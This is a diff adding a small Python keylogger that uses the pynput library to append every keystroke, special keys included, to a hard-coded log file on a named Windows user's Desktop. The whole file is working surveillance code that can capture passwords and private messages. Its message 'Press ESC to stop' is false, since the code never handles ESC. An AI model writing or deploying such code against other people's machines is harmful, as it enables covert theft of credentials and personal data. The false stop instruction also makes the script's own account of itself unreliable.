@@ -1,0 +1,22 @@
+from pynput import keyboard
+
+# Full path to the log file
+log_file = r"C:\Users\Sawant\OneDrive\Desktop\shau\keystrokes_log.txt"
+
+# Function to handle each key press
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")  # Log special keys (e.g., enter, shift)
+
+# Start the keylogger
+def start_keylogger():
+    print("Keylogger started. Press ESC to stop.")
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    start_keylogger()
